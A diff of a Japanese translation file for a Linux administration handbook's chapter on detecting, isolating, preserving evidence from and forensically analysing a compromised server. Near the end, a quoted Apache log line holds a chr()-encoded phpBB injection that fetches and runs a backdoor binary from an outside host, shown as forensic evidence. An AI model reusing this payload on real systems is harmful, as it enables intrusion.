+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: PTAL;
 msgid "An administrator is, more or less implicitly, trusted by their users as well as the users of the network in general. They should therefore avoid any negligence that malevolent people could exploit."
-msgstr "管理者は、程度の差はあるものの暗黙のうちに、自分の管理するユーザと一般のネットワークユーザから信頼されています。そのためユーザは悪意ある人が不法利用することで生じる過失の影響から守られています。"
+msgstr "管理者は程度の差はあれど暗黙のうちに自分の管理するユーザと一般のネットワークユーザから信頼されています。このため、ユーザは管理者に対して自分の過失が悪意ある人によって不正利用されることがないように自分を守ることを期待しています。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: PTAL;
 msgid "An attacker taking control of your machine then using it as a forward base (known as a “relay system”) from which to perform other nefarious activities could cause legal trouble for you, since the attacked party would initially see the attack coming from your system, and therefore consider you as the attacker (or as an accomplice). In many cases, the attacker will use your server as a relay to send spam, which shouldn't have much impact (except potentially registration on black lists that could restrict your ability to send legitimate emails), but won't be pleasant nevertheless. In other cases, more important trouble can be caused from your machine, for instance denial of service attacks. This will sometimes induce loss of revenue, since the legitimate services will be unavailable and data can be destroyed; sometimes this will also imply a real cost, because the attacked party can start legal proceedings against you. Rights-holders can sue you if an unauthorized copy of a work protected by copyright law is shared from your server, as well as other companies compelled by service level agreements if they are bound to pay penalties following the attack from your machine."
-msgstr "あるマシンの制御を奪った攻撃者は、このマシンを前進基地 (「踏み台」として知られています) として使います。管理しているマシンから他の不正な活動を実行されることにより、あなたは法的な問題を被ることになります。なぜなら、攻撃された当事者にしてみれば、あなたのシステムが攻撃元に見えるため、あなたを攻撃者本人 (または共犯者) とみなすでしょう。多くの場合、攻撃者はスパムを送信するための中継サーバとしてあなたのサーバを使います。これは大きな影響をおよぼすものではありません (ブラックリストに登録されて、正規の電子メールを送信することに制限を受けるという潜在的な問題点を除きます)。とは言っても気持ちのよいものではありません。また別の場合、あなたのマシンはサービス拒否攻撃などのより重大な問題の要因になります。これはしばしば損失をもたらす場合があります。なぜなら、正規のサービスが利用できなくなり、データが破壊されるからです。さらに実質的な費用を失うという意味を持つ場合もあります。なぜなら、攻撃された当事者はあなたに対して法的手続きを開始するからです。すなわち、著作権で守られた著作物の認可されていない複製があなたのサーバから共有された場合、権利者は訴訟を起こすことが可能です。さらに、サービス水準合意を交わした他の企業があなたのマシンから攻撃を受けた場合に罰金を支払う契約になっている場合、彼らも訴訟を起こすことが可能です。"
+msgstr "あなたが管理しているマシンの制御を奪った攻撃者は、このマシンを前進基地 (「踏み台」として知られています) として使います。管理しているマシンから他の不正な活動を実行されることにより、あなたは法的な問題を被ることになります。なぜなら、攻撃された当事者にしてみれば、あなたのシステムが攻撃元に見えるため、あなたを攻撃者本人 (または共犯者) とみなすでしょう。多くの場合、攻撃者はスパムを送信するための中継サーバとしてあなたのサーバを使います。これは大きな影響をおよぼすものではありません (ブラックリストに登録されて、正規の電子メールを送信することに制限を受けるという潜在的な問題点を除きます)。とは言ってもこれは気持ちのよいものではありません。また別の場合、あなたのマシンはサービス拒否攻撃などのより重大な問題の要因になります。これはしばしば損失をもたらす場合があります。なぜなら、正規のサービスが利用できなくなり、データが破壊されるからです。さらに実質的な経費が掛かるという意味を持つ場合もあります。なぜなら、攻撃された当事者はあなたに対して法的手続きを開始するからです。すなわち、著作権で守られた著作物の認可されていない複製があなたのサーバから共有された場合、権利者はあなたに対して訴訟を起こすことが可能です。さらに、サービス水準合意を交わした他の企業があなたのマシンから攻撃を受けた場合に罰金を支払う契約になっている場合、彼らもあなたに対して訴訟を起こすことが可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "When these situations occur, claiming innocence is not usually enough; at the very least, you will need convincing evidence showing suspect activity on your system coming from a given IP address. This won't be possible if you neglect the recommendations of this chapter and let the attacker obtain access to a privileged account (root, in particular) and use it to cover their tracks."
-msgstr "これらの状況に陥ると、無罪を主張するだけでは通常十分ではありません。そして少なくとも、ある IP アドレスを経由してあなたのシステム上で行われた疑わしい活動に関する説得力のある証拠を提出する必要があります。この章の推奨を無視し、攻撃者に特権アカウント (特に root) へのアクセスの取得を許し、攻撃者が痕跡を消すために特権アカウントを使うことを許していれば、これは不可能です。"
+msgstr "これらの状況に陥ると、無罪を主張するだけでは通常十分ではありません。少なくとも、ある IP アドレスを経由してあなたのシステム上で行われた疑わしい活動に関する説得力のある証拠を提出する必要があります。この章の推奨を無視し、攻撃者に特権アカウント (特に root) へのアクセスの取得を許し、攻撃者が痕跡を消すために特権アカウントを使うことを許していれば、証拠の提出は不可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Dealing with a Compromised Machine"
 msgstr "不正侵入されたマシンの取り扱い"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances."
-msgstr "最良の意志と注意深く設計されたセキュリティポリシーにも関わらず、結局のところ管理者は乗っ取りに直面します。この節では、不幸な状況に直面した場合にどのように対応するか、いくつかの指針を提供します。"
+msgstr "最良の心構えと注意深く設計されたセキュリティポリシーにも関わらず、結局のところ管理者は乗っ取りに直面します。この節では、不幸な状況に直面した場合の対応方法に関して、いくつかの指針を紹介します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Detecting and Seeing the Cracker's Intrusion"
 msgstr "クラッカー不正侵入の検出と観察"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure."
-msgstr "クラッキング対応の最初の段階はこうした行為を把握することです。クラッキング行為を、特に十分な監視設備がない状態で、把握することは不可能です。"
+msgstr "クラッキング対応の最初の段階はクラッキング行為を把握することです。クラッキング行為を特に十分な監視設備がない状態で把握することは不可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance one named <literal>apache</literal> instead of the standard <literal>/usr/sbin/apache2</literal>. If we follow that example, the thing to do is to note its process identifier, and check <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see what program this process is currently running:"
-msgstr "クラッキング行為は、クラッキング行為がマシンでホストされている正規のサービスに直接的な影響をおよぼすまで、たとえば接続が遅くなったり一部のユーザが接続できなくなったりさまざまな誤作動が起きるまで、検出されないことが多いです。これらの問題に直面したら、管理者はマシンをよく見て不正行為を注意深く調べることが必要です。通常この時点で異常なプロセスが発見されます。たとえば、標準的な <literal>/usr/sbin/apache2</literal> の代わりに <literal>apache</literal> と名付けられたプロセスなどです。この例に従うなら、やるべきことはプロセス ID を確認して、このプロセスが現在実行しているプログラムが何かを見るために <filename>/proc/<replaceable>pid</replaceable>/exe</filename> を確認することです。"
+msgstr "マシンでホストされている正規のサービスに直接的な影響をおよぼすまで (たとえば接続が遅くなったり、一部のユーザが接続できなくなったり、さまざまな誤作動が起きたりするまで)、クラッキング行為は気付かれないことが多いです。これらの問題に直面したら、管理者はマシンをよく見て不正行為を注意深く調べることが必要です。通常この時点で異常なプロセスが発見されます。たとえば標準的な <literal>/usr/sbin/apache2</literal> の代わりに <literal>apache</literal> と名付けられたプロセスなどが発見されます。この例に従うなら、やるべきことはプロセス ID を確認して、このプロセスによって現在実行されているプログラムの実体を確認するために <filename>/proc/<replaceable>pid</replaceable>/exe</filename> を確認することです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid ""
 "\n"
 "<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>\n"
@@ -2623,108 +2754,153 @@ msgstr ""
 "<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
 "      "
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "A program installed under <filename>/var/tmp/</filename> and running as the web server? No doubt left, the machine is compromised."
 msgstr "プログラムが <filename>/var/tmp/</filename> の下にインストールされ、ウェブサーバの権限で実行している? 間違いありません。マシンは不正侵入されています。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This is only one example, but many other hints can ring the administrator's bell:"
 msgstr "これは一例に過ぎませんが、他にも管理者のアンテナに引っかかるような数多くの手掛かりが存在します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to <command>dpkg</command>;"
-msgstr "動作しないコマンド。コマンドが要求するソフトウェアのバージョンが <command>dpkg</command> によってインストールされたと考えられるバージョンと一致しません。"
+msgstr "もはや動作しないはずのオプションを使っているコマンド。コマンドの主張するソフトウェアバージョンが <command>dpkg</command> によってインストールされたと考えられるバージョンと一致しない可能性があります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent;"
 msgstr "最後の接続元が別の大陸にある未知のサーバということを示すコマンドプロンプトやセッション挨拶文。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "errors caused by the <filename>/tmp/</filename> partition being full, which turned out to be full of illegal copies of movies;"
-msgstr "<filename>/tmp/</filename> パーティションが満杯になったことによるエラー。大量の映画の不正コピーで満杯になっています。"
+msgstr "<filename>/tmp/</filename> パーティションが満杯になったことによるエラー。<filename>/tmp/</filename> パーティションが大量の映画の不正コピーで満杯になっている可能性があります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "and so on."
 msgstr "などです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Putting the Server Off-Line"
 msgstr "サーバをオフラインにする"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet."
-msgstr "クラッキングが最も派手に行われる場合を除けば、クラッキングはネットワーク経由で行われ、攻撃者は目標 (機密データへのアクセス、不正ファイルの共有、踏み台としてマシンを使うことによる本人識別情報の隠匿、など) を達成するためにネットワークを必要とします。攻撃者がまだクラッキング行為を完了していない場合、ネットワークからコンピュータを切り離すことで、攻撃者は目標を達成できなくなります。"
+msgstr "クラッキングが最も派手に行われる場合を除けば、クラッキングはネットワーク経由で行われ、攻撃者は目標 (機密データへのアクセス、不正ファイルの共有、踏み台としてマシンを使うことによる本人識別情報の隠匿など) を達成するためにネットワークを必要とします。攻撃者がまだクラッキング行為を完了していないならば、ネットワークからコンピュータを切り離すことで攻撃者は目標を達成できなくなります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see <xref linkend=\"sect.keeping-everything-that-could-be-used-as-evidence\" />, <xref linkend=\"sect.forensic-analysis\" /> and <xref linkend=\"sect.reconstituting-the-attack-scenario\" />), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines."
-msgstr "サーバが物理的にアクセスできる場合のみ、これは可能です。サーバが物凄く遠くにあるホスティングプロバイダのデータセンターでホストされていたり、サーバにその他の理由でアクセスできない場合、いくつかの重要な情報の収集を開始して (<xref linkend=\"sect.keeping-everything-that-could-be-used-as-evidence\" />、<xref linkend=\"sect.forensic-analysis\" />および<xref linkend=\"sect.reconstituting-the-attack-scenario\" />を参照してください)、可能な限り多くの (通常 <command>sshd</command> を除くすべての) サービスをシャットダウンすることで可能な限りサーバを隔離する、ことは通常良いアイディアです。これはまだ都合が悪い状態です。なぜなら、攻撃者は管理者がしているのと同様に SSH アクセスできるからです。このため、マシンを「きれいに」することは難しいです。"
+msgstr "サーバが物理的にアクセスできなければ、コンピュータをネットワークから切り離すことは不可能です。サーバがホスティングプロバイダの物凄く遠くにあるデータセンターでホストされていたり、その他の理由でサーバにアクセスできない場合、いくつかの重要な情報の収集を開始して (<xref linkend=\"sect.keeping-everything-that-could-be-used-as-evidence\" />、<xref linkend=\"sect.forensic-analysis\" />、<xref linkend=\"sect.reconstituting-the-attack-scenario\" />を参照してください)、可能な限り多くの (通常 <command>sshd</command> を除くすべての) サービスをシャットダウンすることで、可能な限りサーバを隔離することは通常良いアイディアです。これはまだ都合が悪い状態です。なぜなら、攻撃者は管理者がしているのと同様に SSH アクセスできるからです。このため、マシンを「きれいに」することは難しいです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Keeping Everything that Could Be Used as Evidence"
 msgstr "証拠として使えるすべての保存"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice."
-msgstr "攻撃を理解したり、攻撃者に対して法的手段を取るには、すべての重要な要素の複製を取ることが必要です。そしてこれには、ハードディスクの内容、すべての実行中プロセスのリスト、すべての開かれた接続のリスト、が含まれます。RAM の内容を使うことも可能ですが、実際にこれが使われることはまれです。"
+msgstr "攻撃を理解したり攻撃者に対して法的手段を取ったりするには、すべての重要な要素の複製を取ることが必要です。ここで重要な要素にはハードディスクの内容、すべての実行中プロセスのリスト、すべての開かれた接続のリストなどが含まれます。RAM の内容が重要な要素に含められる場合もありますが、実際に RAM の内容が役に立つことはまれです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (<command>netstat -tupan</command> for network connections, <command>ps auxf</command> for a list of processes, <command>ls -alR /proc/[0-9]*</command> for a little more information on running programs), and every performed check should carefully be written down."
-msgstr "作業中に、管理者は不正侵入されたマシン上で数多くの事項を確認しようとします。しかしこれは良いアイディアではありません。すべてのコマンドは潜在的に破壊されており、さまざまな証拠を消してしまいます。確認は最低限 (ネットワーク接続状態を確認する <command>netstat -tupan</command>、プロセスのリストを確認する <command>ps auxf</command>、実行中プログラムのより詳しい情報を確認する <command>ls -alR /proc/[0-9]*</command>) に留めるべきです。そして、すべての確認作業を注意深く記録するべきです。"
+msgstr "作業中に、管理者は不正侵入されたマシン上で数多くの事項を確認しようとします。しかし通常これは避けるべきです。すべてのコマンドは破壊されている可能性があり、さまざまな証拠を消してしまいます。管理者は最低限の確認 (ネットワーク接続状態を確認する <command>netstat -tupan</command>、プロセスのリストを確認する <command>ps auxf</command>、実行中プログラムのより詳しい情報を確認する <command>ls -alR /proc/[0-9]*</command>) だけを実行し、実行したすべての確認事項を注意深く記録するべきです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>CAUTION</emphasis> Hot analysis"
 msgstr "<emphasis>CAUTION</emphasis> その場解析"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It's quite possible for a subverted <command>ps</command> command to hide some processes, or for a subverted <command>ls</command> to hide files; sometimes even the kernel is compromised!"
-msgstr "特にサーバが物理的に到達できない場合、起動中のシステムを解析したいと思うかもしれませんが、これは特に避けるべきです。なぜなら、これは特に単純に言って、不正侵入されたシステムに現在インストールされているプログラムを信頼できないからです。破壊された <command>ps</command> コマンドを使えば一部のプロセスを非表示にしたり、破壊された <command>ls</command> を使えば一部のファイルを非表示にすることが可能です。場合によってはカーネルに不正侵入されることすらあるのです!"
+msgstr "特にサーバが物理的にアクセスできない場合、起動中のシステムを解析したいと思うかもしれませんが、これは特に避けるべきです。なぜなら特に単純に言って、不正侵入されたシステムに現在インストールされているプログラムを信頼できないからです。破壊された <command>ps</command> コマンドが一部のプロセスを非表示にしたり、破壊された <command>ls</command> が一部のファイルを非表示にしたりする可能性は高いと言って良いでしょう。場合によってはカーネルに不正侵入されることすらあるのです!"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised."
-msgstr "これでもまだその場解析が必要な場合、既知の良好なプログラムだけを使うように注意するべきです。これを行う良い方法は、破壊されていないプログラムを備えたレスキュー CD または読み込み専用のネットワーク共有を使うことです。しかしながら、カーネル自身が不正侵入されている場合、これらの対策では不十分です。"
+msgstr "これでもまだその場解析が必要な場合、既知の良好なプログラムだけを使うように注意するべきです。これを行う良い方法は、破壊されていないプログラムが含まれるレスキュー CD または読み込み専用のネットワーク共有を使うことです。しかしながらカーネル自身が不正侵入されている場合、これらの対策方法では不十分な場合があります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: $ man 1 sync;
+# Ref: $ man 1 dde;
+# Ref: $ man 1 nc;
+# Tag: L-CFMD;
 msgid "Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled."
-msgstr "「動的な」要素の保存が完了したら、次にハードディスクの完全なイメージを保存します。ファイルシステムの内容が書き変わっている間はそのようなイメージを作ることは不可能です。そのため、ファイルシステムを読み込み専用で再マウントする必要があります。最も簡単な解決策として、(<command>sync</command> を実行した後) サーバを無理やり停止し、レスキュー CD を使って再起動することがよく行われます。各パーティションは <command>dd</command> などのツールを使ってコピーされるべきです。そしてこれらのイメージを他のサーバに送信することが可能です (場合によってはとても便利な <command>nc</command> ツールを使って送信します)。他のより簡単な方法もあります。具体的に言えば、不正侵入されたマシンからディスクを取り出して、再フォーマットおよび再インストールしても問題ない新しいディスクで置き換えます。"
+msgstr "「動的な」要素の保存が完了したら、次にハードディスクの完全なイメージを保存します。ファイルシステムの内容が書き変えられている最中に完全なイメージを作ることは不可能です。そのため、ファイルシステムを読み込み専用で再マウントする必要があります。最も簡単な解決策として、(<command>sync</command> を実行した後に) サーバを無理やり停止し、レスキュー CD を使って再起動することがよく行われます。各パーティションは <command>dd</command> などのツールを使ってコピーされるべきです。この種のイメージを他のサーバに送信することが可能です (場合によってはとても便利な <command>nc</command> ツールを使って送信します)。他のより簡単な方法もあります。その方法とは不正侵入されたマシンからディスクを取り出して、再フォーマットおよび再インストールしても問題ない新しいディスクで置き換える方法です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Re-installing"
 msgstr "再インストール"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary>backdoor</primary>"
 msgstr "<primary>バックドア</primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we get rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates."
-msgstr "不正侵入されたサーバを、完全に再インストールする前に、オンラインに戻すべきではありません。不正侵入が深刻な場合 (管理者権限が奪われていた場合)、再インストール以外に攻撃者が残したすべて (特に<emphasis>バックドア</emphasis>) が一掃されたことを保証する方法はほぼ存在しません。もちろん、攻撃者の使う脆弱性をふさぐために、すべての最新のセキュリティ更新を適用しなければいけません。理想的に言えば、不正侵入の形跡を解析することで、この最新のセキュリティ更新によってふさがれる脆弱性を使って不正侵入が行われたことが明らかになるべきです。そうすれば、実際に攻撃ベクトルが修正されたことを保証することが可能です。しかしこれができなければ、更新によって不正侵入の足掛かりとなった脆弱性が修正されたことを期待することしかできません。"
+msgstr "不正侵入されたサーバを完全に再インストールする前にオンラインに戻すべきではありません。深刻な不正侵入の場合 (管理者権限が奪われていた場合)、再インストール以外に攻撃者が残したすべて (特に<emphasis>バックドア</emphasis>) が一掃されたことを保証する方法はほぼ存在しません。もちろん、攻撃者の使う脆弱性をふさぐために、すべての最新のセキュリティ更新を適用しなければいけません。理想的に言えば、不正侵入の形跡を解析することで、この最新のセキュリティ更新によってふさがれる脆弱性を使って不正侵入が行われたことが明らかになるべきです。そうすれば、実際に攻撃ベクトルが修正されたことを保証することが可能です。しかしこれができなければ、更新によって不正侵入の足掛かりとなった脆弱性が修正されたことを期待することしかできません。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media."
-msgstr "リモートサーバの再インストールは常に簡単というわけではありません。さらにホスティング会社の手助けが必要になる場合があります。なぜなら、ホスティング会社のすべてが自動再インストールシステムを提供しているとは限らないからです。不正侵入後に取られたバックアップからマシンを再インストールしないように注意してください。理想的に言えば、データだけを回復するべきです。実際のソフトウェアはインストールメディアから再インストールされるべきです。"
+msgstr "リモートサーバの再インストールは常に簡単というわけではありません。ホスティング会社の手助けが必要になる場合もあります。なぜなら、ホスティング会社のすべてが自動再インストールシステムを提供しているとは限らないからです。不正侵入後に取られたバックアップからマシンを再インストールしないように注意してください。理想的に言えば、データだけを回復するべきです。実際のソフトウェアはインストールメディアから再インストールされるべきです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Forensic Analysis"
 msgstr "フォレンジック解析"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake."
-msgstr "サービスが回復したら、攻撃ベクトルを理解するために不正侵入されたシステムのディスクイメージの詳細な調査を開始します。これらのイメージをマウントする際に、<literal>ro,nodev,noexec,noatime</literal> オプションを使うことに注意してください。これは (ファイルにアクセスしたタイムスタンプを含めて) 内容の変更を防ぎ、誤って破壊されたプログラムを実行することを防ぐ意味合いがあります。"
+msgstr "サービスが回復したら、攻撃ベクトルを理解するために不正侵入されたシステムのディスクイメージの詳細な調査を開始します。ディスクイメージをマウントする際に、<literal>ro,nodev,noexec,noatime</literal> オプションを使うことに注意してください。これは (ファイルにアクセスしたタイムスタンプを含めて) 内容の変更を防ぎ、誤って破壊されたプログラムを実行することを防ぐ意味合いがあります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Retracing an attack scenario usually involves looking for everything that was modified and executed:"
-msgstr "通常、攻撃シナリオを追跡するには、変更されて実行されたすべてを探し出すことが必要です。"
+msgstr "通常、攻撃シナリオを追跡するには変更されて実行されたすべてを探し出すことが必要です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
+# Ref: man 1 bash;
 msgid "<filename>.bash_history</filename> files often provide for a very interesting read;"
 msgstr "<filename>.bash_history</filename> ファイルには、極めて興味深い内容が含まれます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: PTAL;
 msgid "so does listing files that were recently created, modified or accessed;"
-msgstr "最近作成、修正、アクセスされた listing ファイルも同様です。"
+msgstr "最近作成、修正、アクセスされたファイルの一覧にも極めて興味深い内容が含まれます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: $ man 1 strings;
 msgid "the <command>strings</command> command helps identifying programs installed by the attacker, by extracting text strings from a binary;"
-msgstr "<command>strings</command> コマンドは攻撃者がインストールしたプログラムを識別する助けになります。このコマンドはバイナリからテキスト文字列を抽出します。"
+msgstr "<command>strings</command> コマンドは攻撃者がインストールしたプログラムを識別する助けになります。<command>strings</command> コマンドはバイナリからテキスト文字列を抽出します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "the log files in <filename>/var/log/</filename> often allow reconstructing a chronology of events;"
 msgstr "<filename>/var/log/</filename> 内のログファイルを使えば出来事の経過を追跡することが可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete."
-msgstr "特殊目的のツールを使うことで、潜在的に削除されたファイルの内容を復元することが可能です。このファイルには攻撃者が削除したログファイルなどが含まれます。"
+msgstr "特殊目的のツールを使うことで、削除された可能性のあるファイルすなわち攻撃者が削除することが多いログファイルなどの内容を復元することが可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Some of these operations can be made easier with specialized software. In particular, the <emphasis role=\"pkg\">sleuthkit</emphasis> package provides many tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role=\"pkg\">autopsy</emphasis> package)."
-msgstr "これらの操作は専用ソフトウェアを使うことで簡単に実行することが可能です。特に、<emphasis role=\"pkg\">sleuthkit</emphasis> パッケージはファイルシステムを解析する多くのツールを提供します。これは <emphasis>Autopsy Forensic Browser</emphasis> グラフィカルインターフェース (<emphasis role=\"pkg\">autopsy</emphasis> パッケージに含まれます) から簡単に使うことが可能です。"
+msgstr "これらの操作は専用ソフトウェアを使うことで簡単に実行することが可能です。特に、<emphasis role=\"pkg\">sleuthkit</emphasis> パッケージにはファイルシステムを解析する多くのツールが含まれます。<emphasis>Autopsy Forensic Browser</emphasis> グラフィカルインターフェース (<emphasis role=\"pkg\">autopsy</emphasis> パッケージに含まれます) を使えば、これらのツールを簡単に使うことが可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary>Autopsy Forensic Browser</primary>"
 msgstr "<primary>Autopsy Forensic Browser</primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary>The Sleuth Kit</primary>"
 msgstr "<primary>The Sleuth Kit</primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Reconstituting the Attack Scenario"
 msgstr "攻撃シナリオの再構成"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings."
-msgstr "解析中に収集されたすべての要素はジグソーパズルのピースのように組み合わさるべきです。そして最初の疑わしいファイルの作成は破壊を証明するログと関係があります。実世界の例は長ったらしい理論よりもさらに明快なものであるべきです。"
+msgstr "解析中に収集されたすべての要素はジグソーパズルのピースのように組み合わさるべきです。最初の疑わしいファイルの作成は破壊を証明するログと関係があります。実例は長ったらしい理論よりもさらに明快なものであるべきです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The following log is an extract from an Apache <filename>access.log</filename>:"
-msgstr "以下のログは Apache <filename>access.log</filename> から抽出したものです。"
+msgstr "以下に Apache <filename>access.log</filename> から抜粋したログを示します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid ""
 "\n"
 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
@@ -2734,15 +2910,19 @@ msgstr ""
